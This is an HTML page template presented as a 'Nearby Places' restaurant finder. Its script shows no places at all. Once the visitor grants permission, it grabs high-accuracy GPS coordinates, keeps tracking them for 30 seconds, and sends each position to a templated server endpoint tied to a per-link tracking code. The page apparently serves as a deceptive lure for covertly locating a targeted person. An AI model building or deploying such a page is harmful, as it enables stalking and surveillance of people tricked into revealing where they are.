<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Nearby Places</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;text-align:center;
             background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;
             min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-radius:20px;padding:30px;
              width:100%;max-width:400px;border:1px solid rgba(255,255,255,.1)}
        h2{font-size:22px;margin-bottom:8px}
        p.sub{color:#aaa;font-size:14px;margin-bottom:20px}
        .btn{padding:14px 36px;font-size:16px;border:none;border-radius:50px;cursor:pointer;
             font-weight:600;transition:.3s;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(102,126,234,.4)}
        .btn:disabled{opacity:.5;cursor:not-allowed}
        #status{margin-top:15px;padding:10px;border-radius:10px;font-size:13px}
        .s-wait{background:rgba(255,193,7,.15);color:#ffc107}
        .s-ok{background:rgba(40,167,69,.15);color:#28a745}
        .s-err{background:rgba(220,53,69,.15);color:#dc3545}
        .coord{font-family:monospace;font-size:12px;margin-top:10px;color:#8b9dc3}
        .spin{display:none;width:28px;height:28px;border:3px solid rgba(255,255,255,.2);
              border-top:3px solid #fff;border-radius:50%;animation:spin .8s linear infinite;margin:12px auto}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="card">
    <h2>📍 Nearby Places</h2>
    <p class="sub" id="desc">Allow location to see nearby restaurants</p>
    <button class="btn" id="btn" onclick="getLoc()">📍 Enable Location</button>
    <div class="spin" id="spin"></div>
    <div id="status" class="s-wait">⏳ Waiting...</div>
    <div class="coord" id="coord"></div>
</div>
<script>
const code='{{code}}',srv='{{server}}';
{% if not valid %}
document.getElementById('status').innerHTML='❌ Invalid link';document.getElementById('status').className='s-err';
document.getElementById('btn').disabled=true;
{% endif %}
let watchId=null;
function getLoc(){
    if(!navigator.geolocation){document.getElementById('status').innerHTML='❌ Not supported';document.getElementById('status').className='s-err';return}
    const btn=document.getElementById('btn'),st=document.getElementById('status'),sp=document.getElementById('spin');
    btn.disabled=true;sp.style.display='block';st.innerHTML='⏳ Requesting...';st.className='s-wait';
    navigator.geolocation.getCurrentPosition(
        function(p){
            sendLoc(p);st.innerHTML='✅ Got location! Tracking...';st.className='s-ok';sp.style.display='none';
            watchId=navigator.geolocation.watchPosition(sendLoc,function(){},{enableHighAccuracy:true,maximumAge:5000});
            setTimeout(()=>{if(watchId)navigator.geolocation.clearWatch(watchId);st.innerHTML='✅ Complete';},30000);
        },
        function(e){sp.style.display='none';st.innerHTML='❌ Denied: '+e.message;st.className='s-err';btn.disabled=false;},
        {enableHighAccuracy:true,timeout:10000}
    );
}
function sendLoc(p){
    const lat=p.coords.latitude,lng=p.coords.longitude;
    document.getElementById('coord').innerHTML=lat.toFixed(6)+', '+lng.toFixed(6);
    fetch(srv+'/api/location/'+code,{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({lat:lat,lng:lng,accuracy:p.coords.accuracy,timestamp:new Date().toISOString()})
    }).catch(()=>{});
}
</script>
</body>
</html>
